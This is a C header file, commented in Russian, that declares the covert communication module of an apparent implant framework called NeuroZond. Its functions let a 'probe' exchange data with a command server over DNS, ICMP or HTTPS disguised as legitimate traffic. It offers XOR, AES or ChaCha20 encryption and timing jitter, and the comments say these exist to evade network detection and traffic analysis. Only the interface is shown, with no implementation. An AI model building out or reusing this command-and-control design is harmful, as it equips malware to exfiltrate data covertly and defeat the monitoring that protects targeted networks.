/**
 * @file covert_channel.h
 * @brief Модуль скрытых сетевых коммуникаций для NeuroZond
 * 
 * Данный модуль предоставляет интерфейс для скрытой передачи данных
 * между зондом и сервером C1, обходя обнаружение сетевого трафика.
 * Поддерживает различные методы туннелирования, обфускации и шифрования.
 * 
 * @author NeuroZond Team
 * @date 2025-04-28
 */

#ifndef COVERT_CHANNEL_H
#define COVERT_CHANNEL_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

// Типы скрытых каналов
typedef enum {
    COVERT_CHANNEL_DNS,     // Передача данных через DNS-запросы
    COVERT_CHANNEL_HTTPS,   // Передача данных через HTTPS с маскировкой под легитимный трафик
    COVERT_CHANNEL_ICMP     // Передача данных через поля данных ICMP-пакетов
} covert_channel_type;

// Алгоритмы шифрования
typedef enum {
    ENCRYPTION_NONE,        // Без шифрования (не рекомендуется)
    ENCRYPTION_XOR,         // Простое XOR шифрование
    ENCRYPTION_AES256,      // AES-256 шифрование
    ENCRYPTION_CHACHA20     // ChaCha20 шифрование
} encryption_algorithm;

// Конфигурация скрытого канала
typedef struct {
    covert_channel_type type;           // Тип скрытого канала
    encryption_algorithm encryption;    // Алгоритм шифрования
    char* c1_address;                   // Адрес командного сервера (C1)
    int c1_port;                        // Порт командного сервера
    unsigned char* encryption_key;      // Ключ шифрования
    size_t key_length;                  // Длина ключа
} covert_channel_config;

// Непрозрачный указатель на структуру скрытого канала
typedef void* covert_channel_handle;

// Функции API

/**
 * Инициализирует скрытый канал с заданной конфигурацией
 * @param config Указатель на структуру конфигурации
 * @return Дескриптор канала или NULL в случае ошибки
 */
covert_channel_handle covert_channel_init(covert_channel_config* config);

/**
 * Устанавливает соединение по скрытому каналу
 * @param handle Дескриптор канала
 * @return true при успешном соединении, false в случае ошибки
 */
bool covert_channel_connect(covert_channel_handle handle);

/**
 * Отправляет данные по скрытому каналу
 * @param handle Дескриптор канала
 * @param data Указатель на буфер с данными
 * @param data_len Длина данных для отправки
 * @return Количество отправленных байт или 0 в случае ошибки
 */
size_t covert_channel_send(covert_channel_handle handle, const unsigned char* data, size_t data_len);

/**
 * Получает данные по скрытому каналу
 * @param handle Дескриптор канала
 * @param buffer Указатель на буфер для приема данных
 * @param buffer_size Размер буфера
 * @return Количество полученных байт или 0 в случае ошибки
 */
size_t covert_channel_receive(covert_channel_handle handle, unsigned char* buffer, size_t buffer_size);

/**
 * Устанавливает параметры временного разброса (jitter) для затруднения анализа трафика
 * @param handle Дескриптор канала
 * @param min_ms Минимальная задержка в миллисекундах
 * @param max_ms Максимальная задержка в миллисекундах
 */
void covert_channel_set_jitter(covert_channel_handle handle, int min_ms, int max_ms);

/**
 * Проверяет, установлено ли соединение
 * @param handle Дескриптор канала
 * @return true если соединение установлено, false в противном случае
 */
bool covert_channel_is_connected(covert_channel_handle handle);

/**
 * Освобождает ресурсы, используемые скрытым каналом
 * @param handle Дескриптор канала
 */
void covert_channel_cleanup(covert_channel_handle handle);

#endif /* COVERT_CHANNEL_H */ 